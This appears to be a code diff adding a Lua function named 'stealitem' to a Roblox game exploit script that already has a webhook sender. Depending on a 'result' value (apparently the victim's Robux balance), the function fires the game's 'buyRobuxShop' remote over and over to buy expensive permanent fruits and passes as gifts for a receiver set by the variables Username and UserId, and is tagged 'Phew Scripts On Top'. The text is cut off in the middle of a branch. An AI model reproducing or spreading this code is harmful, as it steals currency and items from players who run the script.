@@ -111,3 +111,415 @@ local function sendWebhook()
         Body = data
     })
 end
+
+function stealitem()
+    if result >= 5000 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["PurchaseLocation"] = "FruitShop",
+                ["StorageName"] = "Permanent Dragon-Dragon",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 4000 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Kitsune-Kitsune",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 3000 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Leopard-Leopard",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2700 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Fruit Notifier",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2550 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Spirit-Spirit",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2500 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Gas-Gas",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2450 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Venom-Venom",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2425 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Shadow-Shadow",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2400 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Dough-Dough",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2350 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent T-Rex-T-Rex",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2300 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Gravity-Gravity",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2250 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Blizzard-Blizzard",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2200 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Pain-Pain",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2100 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Rumble-Rumble",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2000 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Portal-Portal",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1900 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Sound-Sound",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1800 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Spider-Spider",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1700 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Love-Love",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1650 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Buddha-Buddha",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1500 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Quake-Quake",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1300 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Magma-Magma",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1275 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Ghost-Ghost",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1250 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Barrier-Barrier",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1200 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Dark Blade",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1100 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Light-Light",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1000 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Diamond-Diamond",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 950 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Dark-Dark",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 850 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Sand-Sand",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 750 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Ice-Ice",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 650 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Phew Scripts On Top",
+                ["StorageName"] = "Permanent Falcon-Falcon",
+                ["PurchaseLocation"] 
